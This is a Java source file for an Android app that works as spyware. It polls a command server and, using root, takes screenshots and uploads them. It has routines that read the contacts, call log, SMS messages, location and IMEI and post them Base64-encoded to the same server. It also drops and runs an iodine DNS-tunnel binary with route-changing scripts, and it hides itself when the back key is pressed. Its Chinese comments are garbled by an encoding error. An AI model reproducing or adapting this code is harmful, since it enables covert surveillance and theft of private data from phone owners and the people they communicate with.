package com.example.prp;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;

import android.app.Activity;  
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;  
import android.os.Handler;  
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;  
import android.view.View.OnClickListener;  
import android.widget.Button;  
import android.widget.TextView;  
  
public class MainActivity extends Activity {  
    private Button btnUploadFile; 
    private Button btnStartIodine;
    private Button btnChangeRoute;
    private Button btnStartDect;
    private Button btnStop;   
    private Button btnDeleteFile; 
    private TextView tvResult;  
    private String result = "";  
    private boolean run = false; 
    
    private static int delayTime = 5000;
    
    private static String ipAddr = "10.0.0.1";
  
    private Handler handler = new Handler();  
  
    private Runnable task = new Runnable() {  
  
        public void run() {   
            if (run) {  
                handler.postDelayed(this, delayTime);            
               
                String command = getCommand();                
                try{
	    			if(!command.equals("noCommand")){
	    				String[] temp = command.split(":");
	    				String command_id = temp[0];
	    				String command_type = temp[1];
	    				String target = temp[2];
	    				
	    				String[] deviceInfo = getDeviceInfo();
	    				String IMEI = deviceInfo[0];
	    				
	    				if(IMEI.equals(target)){	    				
		    				String data = "";		    				
		    				switch(Integer.parseInt(command_type)){
		    					case 1:data = replyPicture(command_id);break;
		    					default:data = "invalidCommand";break;
		    				}
		    				
		    				if(data != "invalidCommand"){
		    					result = data;
		    				}
		    				else{
		    					result = "invalidCommand";
		    				}
	    				}
	    				else{
	    					result = "noCommand";
	    				}
	    				
	    			}
	    			else{
	    				result = "noCommand";    				
	    			}
                }
                catch(Exception ee) {  
        			result = ee.getMessage();
        		}
                
            }  
            tvResult.setText(result);            
        }  
    };  
  
    /** Called when the activity is first created. */  
    @Override  
    public void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        btnUploadFile = (Button) findViewById(R.id.Button01);  
        btnStartIodine = (Button) findViewById(R.id.Button02);  
        btnChangeRoute = (Button) findViewById(R.id.Button03);  
        btnStartDect = (Button) findViewById(R.id.Button04); 
        btnStop = (Button) findViewById(R.id.Button05);  
        btnDeleteFile = (Button) findViewById(R.id.Button06);
        tvResult = (TextView) findViewById(R.id.result);  
  
        btnUploadFile.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		createFile();
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
        			execCommand("chmod 777 ." + fileDirPath + "/" + "iodine");
        			execCommand("chmod 777 ." + fileDirPath + "/" + "start_iodine.sh");
                	execCommand("chmod 777 ." + fileDirPath + "/" + "change_route.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(2);  
        	}
        });
        
        btnStartIodine.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
                	execCommand("sh ." + fileDirPath + "/" + "start_iodine.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(3);  
        	}
        });
        
        btnChangeRoute.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
                	execCommand("sh ." + fileDirPath + "/" + "change_route.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(4);  
        	}
        });
        
        btnStartDect.setOnClickListener(new OnClickListener() {    
            public void onClick(View v) {  
                run = true;  
                updateButton(5);  
                //TODO
                handler.postDelayed(task, delayTime);  
                //replyDeviceInfo();
                //replyDeviceContacts();
                //replyDeviceLocations();
                //replyDeviceCallingRecords();
                //replyDeviceSMSRecords();
            }  
        }); 
        
        btnStop.setOnClickListener(new OnClickListener() {  
            public void onClick(View v) {    
                run = false;  
                updateButton(1);  
                handler.post(task); 
                execCommand("killall iodine");
                tvResult.setText("Stopped");
            }  
        });
        
        btnDeleteFile.setOnClickListener(new OnClickListener() {  
            public void onClick(View v) {  
            	execCommand("killall iodine");
                deleteFile();
            }  
        });
        
        //TODO
        //replyDeviceInfo();
        //replyDeviceContacts();
        //replyDeviceLocations();
        //replyDeviceCallingRecords();
        //getDeviceLocation();
        //replyPicture();
        
        run = true;  
        updateButton(5);  
        handler.postDelayed(task, delayTime);
         
    }  
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
    	if (keyCode == KeyEvent.KEYCODE_BACK) {
    			moveTaskToBack(false);
    			return true;
    	}
    	return super.onKeyDown(keyCode, event);
    }
  
    private void updateButton(int status) {  
        if(status == 1){
        	btnUploadFile.setEnabled(true);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }  
        else if(status == 2){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(true);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 3){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(true);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 4){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(true); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 5){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(true);         	
        }
    }  
    
    
    /**��ȡ����**/
	private String getCommand(){   
		try{  
			URL url = new URL("http://" + ipAddr + "/prp/index.php/command/get_command");  
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
			conn.setDoInput(true);  
			conn.setConnectTimeout(10000);  
			conn.setRequestMethod("GET");  
			conn.setRequestProperty("accept", "*/*");  
			String location = conn.getRequestProperty("location");  
			int resCode = conn.getResponseCode();  
			conn.connect();  
			InputStream stream = conn.getInputStream();  
			byte[] data=new byte[102400];  
			int length=stream.read(data);  
			String str=new String(data,0,length);   
			conn.disconnect();  			
			stream.close();  
			return str;
		}  
		catch(Exception ee) {  
			return ee.getMessage();
		}  
	} 
	
	/**�õ��ֻ�ͨѶ¼��ϵ����Ϣ**/
    private String getPhoneContacts() {
    	String temp_result = "";
    	
    	//�õ�ContentResolver����
        ContentResolver cr = getContentResolver();
        //ȡ�õ绰���п�ʼһ��Ĺ��
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //�����ƶ����
        while(cursor.moveToNext())
        {
            //ȡ����ϵ������
            int nameFieldColumnIndex = cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME);
            String contact = cursor.getString(nameFieldColumnIndex);
            //ȡ�õ绰����
            String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, 
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
             
            while(phone.moveToNext())
            {
                String PhoneNumber = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                temp_result += (contact + ":" + PhoneNumber + "\n");
            }
        }
        cursor.close();
        
        return temp_result.trim();
    }
    
    /**�ظ�����**/
	private String replyCommand(String command_id,String result){  
		String password = "123456";
		String temp_url = "http://" + ipAddr + "/prp/index.php/command/reply_command";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("password", password));
	        params.add(new BasicNameValuePair("result", command_id + ":" + Base64.encodeToString(result.getBytes(),Base64.DEFAULT)));
	        

	        /* �������������������*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*�������󲢵ȴ���Ӧ*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*��״̬��Ϊ200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*����������*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	
	/*�ϴ���Ҫ���ļ�*/
	private void createFile() {
		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
		
		//�ϴ�iodine
		String filePath = fileDirPath + "/" + "iodine";// �ļ�·��
		try{
			File dir = new File(fileDirPath);// Ŀ¼·��
			if(!dir.exists()){// ��������ڣ��򴴽�·����
				tvResult.setText("Ҫ�洢��Ŀ¼������");
				if(dir.mkdirs()){// ������·����������true���ʾ�����ɹ�
					tvResult.setText("�Ѿ������ļ��洢Ŀ¼");
				} 
				else{
					tvResult.setText("����Ŀ¼ʧ��");
				}
			}
			// Ŀ¼���ڣ���apk��raw�е���Ҫ���ĵ����Ƶ���Ŀ¼��
			File file = new File(filePath);
			if (!file.exists()){// �ļ�������
				tvResult.setText("Ҫ�򿪵��ļ�������");
				InputStream ins = getResources().openRawResource(R.raw.iodine);//ͨ��raw�õ�������Դ
				tvResult.setText("��ʼ����");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("��ʼд��");
				byte[] buffer = new byte[8192];
				int count = 0;// ѭ��д��
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("�Ѿ��������ļ�");
				fos.close();// �ر���
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
		
		//�ϴ�start_iodine.sh
		filePath = fileDirPath + "/" + "start_iodine.sh";// �ļ�·��
		try{
			File dir = new File(fileDirPath);// Ŀ¼·��
			if(!dir.exists()){// ��������ڣ��򴴽�·����
				tvResult.setText("Ҫ�洢��Ŀ¼������");
				if(dir.mkdirs()){// ������·����������true���ʾ�����ɹ�
					tvResult.setText("�Ѿ������ļ��洢Ŀ¼");
				} 
				else{
					tvResult.setText("����Ŀ¼ʧ��");
				}
			}
			// Ŀ¼���ڣ���apk��raw�е���Ҫ���ĵ����Ƶ���Ŀ¼��
			File file = new File(filePath);
			if (!file.exists()){// �ļ�������
				tvResult.setText("Ҫ�򿪵��ļ�������");
				InputStream ins = getResources().openRawResource(R.raw.start_iodine);//ͨ��raw�õ�������Դ
				tvResult.setText("��ʼ����");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("��ʼд��");
				byte[] buffer = new byte[8192];
				int count = 0;// ѭ��д��
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("�Ѿ��������ļ�");
				fos.close();// �ر���
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
		
		//�ϴ�change_route.sh
		filePath = fileDirPath + "/" + "change_route.sh";// �ļ�·��
		try{
			File dir = new File(fileDirPath);// Ŀ¼·��
			if(!dir.exists()){// ��������ڣ��򴴽�·����
				tvResult.setText("Ҫ�洢��Ŀ¼������");
				if(dir.mkdirs()){// ������·����������true���ʾ�����ɹ�
					tvResult.setText("�Ѿ������ļ��洢Ŀ¼");
				} 
				else{
					tvResult.setText("����Ŀ¼ʧ��");
				}
			}
			// Ŀ¼���ڣ���apk��raw�е���Ҫ���ĵ����Ƶ���Ŀ¼��
			File file = new File(filePath);
			if (!file.exists()){// �ļ�������
				tvResult.setText("Ҫ�򿪵��ļ�������");
				InputStream ins = getResources().openRawResource(R.raw.change_route);//ͨ��raw�õ�������Դ
				tvResult.setText("��ʼ����");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("��ʼд��");
				byte[] buffer = new byte[8192];
				int count = 0;// ѭ��д��
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("�Ѿ��������ļ�");
				fos.close();// �ر���
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
	}
	
	/*ɾ���ϴ����ļ�*/
	private void deleteFile(){
		try{
			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
					
			String filePath = fileDirPath + "/" + "iodine";// �ļ�·��
			File file = new File(filePath);
			file.delete();	
			
			filePath = fileDirPath + "/" + "start_iodine.sh";// �ļ�·��
			file = new File(filePath);
			file.delete();
			
			filePath = fileDirPath + "/" + "change_route.sh";// �ļ�·��
			file = new File(filePath);
			file.delete();
			tvResult.setText("delete files sucess");
		}
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
	}
	
	/*ִ�нű�*/
	public void execCommand(String command){
	    try{
	        //Ȩ������
	        Process p = Runtime.getRuntime().exec("su");
	        //��ȡ�����
	        OutputStream outputStream = p.getOutputStream();
	        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
	        //������д��
	        dataOutputStream.writeBytes(command);
	        //�ύ����
	        dataOutputStream.flush();
	        //�ر�������
	        dataOutputStream.close();
	        outputStream.close();
	        tvResult.setText("shell " + command + " sucess");
	    }
	    catch(Exception e){
	        tvResult.setText(e.getMessage());
	    }
    }
	
	/**��ȡ�豸������Ϣ**/
	private String[] getDeviceInfo(){ 
		TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		String[] deviceInfo = {tm.getDeviceId(),tm.getLine1Number(),Build.MODEL,Build.VERSION.RELEASE};
		return deviceInfo;
	}
	
	/**��ȡ�豸λ����Ϣ**/
	private double[] getDeviceLocation(){		
		double latitude=0.0;
		double longitude =0.0;

		LocationManager locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
			Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
			if(location != null){
				latitude = location.getLatitude();
				longitude = location.getLongitude();
				tvResult.setText("latitude:"+latitude+"\nlongitude"+longitude);
				}
		}
		else{
			LocationListener locationListener = new LocationListener() {
				
				// Provider��״̬�ڿ��á���ʱ�����ú��޷�������״ֱ̬���л�ʱ�����˺���
				@Override
				public void onStatusChanged(String provider, int status, Bundle extras) {
					
				}
				
				// Provider��enableʱ�����˺���������GPS����
				@Override
				public void onProviderEnabled(String provider) {
					
				}
				
				// Provider��disableʱ�����˺���������GPS���ر� 
				@Override
				public void onProviderDisabled(String provider) {
					
				}
				
				//������ı�ʱ�����˺��������Provider������ͬ�����꣬���Ͳ��ᱻ���� 
				@Override
				public void onLocationChanged(Location location) {
					if (location != null) {   
						Log.e("Map", "Location changed : Lat: "  
						+ location.getLatitude() + " Lng: "  
						+ location.getLongitude());  
						tvResult.setText("latitude:"+location.getLatitude()+"\nlongitude"+location.getLongitude());
					}
				}
			};
			locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,1000, 0,locationListener);   
			Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);   
			if(location != null){   
				latitude = location.getLatitude(); //����   
				longitude = location.getLongitude(); //γ��
				tvResult.setText("latitude:"+latitude+"\nlongitude"+longitude);
			}   
		}
		double[] location = {latitude,longitude};		
		return location;
	}
	/**�õ��ֻ�ͨ����¼**/
    private String getPhoneCallingRecords() {
    	String temp_result = "";
    	
    	ContentResolver cr = getContentResolver();		
		//��ѯͨ����¼
		Cursor cursor = cr.query(
				CallLog.Calls.CONTENT_URI,	//ʹ��ϵͳURI��ȡ��ͨ����¼
				new String[] { CallLog.Calls.NUMBER, //�绰��
						CallLog.Calls.CACHED_NAME,	//��ϵ��
						CallLog.Calls.TYPE, //ͨ������
						CallLog.Calls.DATE,	//ͨ��ʱ��
						CallLog.Calls.DURATION //ͨ��ʱ��
						}, null, null,
				CallLog.Calls.DEFAULT_SORT_ORDER);
		
		//����ÿ��ͨ����¼
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			String strNumber = cursor.getString(0); // ���к���
			String strName = cursor.getString(1); // ��ϵ������
			int type = cursor.getInt(2); 
			String str_type = "";
			if(type == CallLog.Calls.INCOMING_TYPE){
				str_type = "����";
			}else if(type == CallLog.Calls.OUTGOING_TYPE){
				str_type = "����";
			}else if(type == CallLog.Calls.MISSED_TYPE){
				str_type = "δ��";
			}
			long duration = cursor.getLong(4);
			SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			Date date = new Date(Long.parseLong(cursor.getString(3)));
			String time = sfd.format(date);

			temp_result += (strNumber + "%" + time + "%" + str_type + "%" + duration + "\n");
		}
        
        return temp_result.trim();
    }
	/**�õ��ֻ�ͨ����¼**/
    private String getPhoneSMSRecords() {
    	String temp_result = "";
    	
    	final String SMS_URI_ALL   = "content://sms/";     
	    final String SMS_URI_INBOX = "content://sms/inbox";   
	    final String SMS_URI_SEND  = "content://sms/sent";   
	    final String SMS_URI_DRAFT = "content://sms/draft";   
	    
    	ContentResolver cr = getContentResolver();   
        String[] projection = new String[]{"_id", "address", "person",    
                "body", "date", "type"};   
        Uri uri = Uri.parse(SMS_URI_ALL);   
        Cursor cur = cr.query(uri, projection, null, null, "date desc");   
  
        if (cur.moveToFirst()) {   
            String name;    
            String phoneNumber;          
            String smsbody;   
            String date;   
            String type;   
            
            int nameColumn = cur.getColumnIndex("person");   
            int phoneNumberColumn = cur.getColumnIndex("address");   
            int smsbodyColumn = cur.getColumnIndex("body");   
            int dateColumn = cur.getColumnIndex("date");   
            int typeColumn = cur.getColumnIndex("type");   
            
            do{   
                name = cur.getString(nameColumn);                
                phoneNumber = cur.getString(phoneNumberColumn);   
                smsbody = cur.getString(smsbodyColumn);   
                   
                SimpleDateFormat dateFormat = new SimpleDateFormat(   
                        "yyyy-MM-dd hh:mm:ss");   
                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));   
                date = dateFormat.format(d);   
                   
                int typeId = cur.getInt(typeColumn);   
                if(typeId == 1){   
                    type = "����";   
                } 
                else if(typeId == 2){   
                    type = "����";   
                } 
                else {   
                    type = "";   
                }   
                                
                temp_result += (phoneNumber + "%" + date + "%" + type + "%" + smsbody + "\n");
                
                if(smsbody == null) smsbody = "";     
            }while(cur.moveToNext());   
        } 
        else {   
            ;
        }   
                    
        return temp_result.trim();
    }    
    /**�����豸������Ϣ**/
	private String replyDeviceInfo(){ 
		String[] deviceInfo = getDeviceInfo();
		
		deviceInfo[0] = (deviceInfo[0].length() == 0) ? "no IMEI" : deviceInfo[0];
		deviceInfo[1] = (deviceInfo[1].length() == 0) ? "no phoneNumber" : deviceInfo[1];
		deviceInfo[2] = (deviceInfo[2].length() == 0) ? "no phoneType" : deviceInfo[2];
		deviceInfo[3] = (deviceInfo[3].length() == 0) ? "no systemType" : deviceInfo[3];
		
		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_info";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("phoneNumber", Base64.encodeToString(deviceInfo[1].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("phoneType", Base64.encodeToString(deviceInfo[2].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("system", Base64.encodeToString(deviceInfo[3].getBytes(),Base64.DEFAULT)));

	        /* �������������������*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*�������󲢵ȴ���Ӧ*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*��״̬��Ϊ200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*����������*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	/**�����豸ͨѶ¼��Ϣ**/
	private String replyDeviceContacts(){ 
		String[] deviceInfo = getDeviceInfo();
		String contacts = getPhoneContacts();
		if(contacts.length() != 0){
			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_contacts";
			try{  
				HttpPost httpRequest = new HttpPost(temp_url); 
				
				List <NameValuePair> params = new ArrayList <NameValuePair>();
		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
		        params.add(new BasicNameValuePair("contacts", Base64.encodeToString(contacts.getBytes(),Base64.DEFAULT)));
	
		        /* �������������������*/
		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
		        /*�������󲢵ȴ���Ӧ*/
		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
		        /*��״̬��Ϊ200 ok*/
		        if(httpResponse.getStatusLine().getStatusCode() == 200){
		        	/*����������*/
		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
		        	return strResult;
		        }
		        else{
		        	return "postError";
		        }
				
			}  
			catch(Exception ee) {  
				return "error:" + ee.getMessage();
			}  
		}
		else{
			return "no contacts";
		}
	}
	/**�����豸λ����Ϣ**/
	private String replyDeviceLocations(){ 
		String[] deviceInfo = getDeviceInfo();
		double[] deviceLocation = getDeviceLocation();
		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_locations";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("latitude", Base64.encodeToString(Double.toString(deviceLocation[0]).getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("longitude", Base64.encodeToString(Double.toString(deviceLocation[0]).getBytes(),Base64.DEFAULT)));

	        /* �������������������*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*�������󲢵ȴ���Ӧ*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*��״̬��Ϊ200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*����������*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	/**�����豸ͨ����¼**/
	private String replyDeviceCallingRecords(){ 
		String[] deviceInfo = getDeviceInfo();
		String callingRecords = getPhoneCallingRecords();
		if(callingRecords.length() != 0){
			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_calling_records";
			try{  
				HttpPost httpRequest = new HttpPost(temp_url); 
				
				List <NameValuePair> params = new ArrayList <NameValuePair>();
		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
		        params.add(new BasicNameValuePair("calling_records", Base64.encodeToString(callingRecords.getBytes(),Base64.DEFAULT)));
	
		        /* �������������������*/
		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
		        /*�������󲢵ȴ���Ӧ*/
		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
		        /*��״̬��Ϊ200 ok*/
		        if(httpResponse.getStatusLine().getStatusCode() == 200){
		        	/*����������*/
		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
		        	return strResult;
		        }
		        else{
		        	return "postError";
		        }
				
			}  
			catch(Exception ee) {  
				return "error:" + ee.getMessage();
			}  
		}
		else{
			return "no callingRecords";
		}
	}
	/**�����豸���ż�¼**/
	private String replyDeviceSMSRecords(){ 
		String[] deviceInfo = getDeviceInfo();
		String smsRecords = getPhoneSMSRecords();
		if(smsRecords.length() != 0){
			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_sms_records";
			try{  
				HttpPost httpRequest = new HttpPost(temp_url); 
				
				List <NameValuePair> params = new ArrayList <NameValuePair>();
		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
		        params.add(new BasicNameValuePair("sms_records", Base64.encodeToString(smsRecords.getBytes(),Base64.DEFAULT)));
	
		        /* �������������������*/
		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
		        /*�������󲢵ȴ���Ӧ*/
		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
		        /*��״̬��Ϊ200 ok*/
		        if(httpResponse.getStatusLine().getStatusCode() == 200){
		        	/*����������*/
		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
		        	return strResult;
		        }
		        else{
		        	return "postError";
		        }
				
			}  
			catch(Exception ee) {  
				return "error:" + ee.getMessage();
			}  
		}
		else{
			return "no smsRecords";
		}
	}
	/**����ͼƬ**/
	public String replyPicture(String command_id){	
		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
		String result = takePicture("",fileDirPath);
        //String result = "sucess";
        if(result.equals("sucess")){        	
            try{        	      	
            	List <NameValuePair> params = new ArrayList <NameValuePair>();
            	String fileName = "img.png";
    	        params.add(new BasicNameValuePair("userfile", fileDirPath + "/" + fileName));
    	        params.add(new BasicNameValuePair("command_id", Base64.encodeToString(command_id.getBytes(),Base64.DEFAULT)));
    	        
    	        return postPicture("http://" + ipAddr + "/prp/index.php/device/reply_picture",params,fileName,"image/png");
            }
            catch(Exception e){
            	return e.getMessage();
            }	
        } 
        else{
        	return result;        	
        } 
	}
	public String postPicture(final String url, final List<NameValuePair> nameValuePairs, String fileName, String fileType) {
	    final HttpClient httpClient = new DefaultHttpClient();
	    final HttpContext localContext = new BasicHttpContext();
	    final HttpPost httpPost = new HttpPost(url);

	    try {
	        final MultipartEntity entity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);

	        for(int index=0; index < nameValuePairs.size(); index++) {
	            if(nameValuePairs.get(index).getName().equalsIgnoreCase("userfile")) {
	                // If the key equals to "userfile", we use FileBody to transfer the data
	                entity.addPart(nameValuePairs.get(index).getName(), new FileBody(new File (nameValuePairs.get(index).getValue()), fileName, fileType, "utf-8"));
	            } else {
	                // Normal string data
	                entity.addPart(nameValuePairs.get(index).getName(), new StringBody(nameValuePairs.get(index).getValue()));
	            }
	        }

	        httpPost.setEntity(entity);

	        final HttpResponse response = httpClient.execute(httpPost, localContext);

	        final String responseBody = EntityUtils.toString(response.getEntity());
	        System.out.println("RESPONSE BODY: " + responseBody);
	        return responseBody;
	    } 
	    catch (final IOException e) {
	        e.printStackTrace();
	        return e.getMessage();
	    }
	}
	/**��̨����**/
	public String takePicture(String file,String fileDirPath){
		try{
			
			execCommand("/system/bin/screencap -p " + fileDirPath + "/img.png");
	        return "sucess";
		}
		catch(Exception e){
			return e.getMessage();
		}		
	}
}  
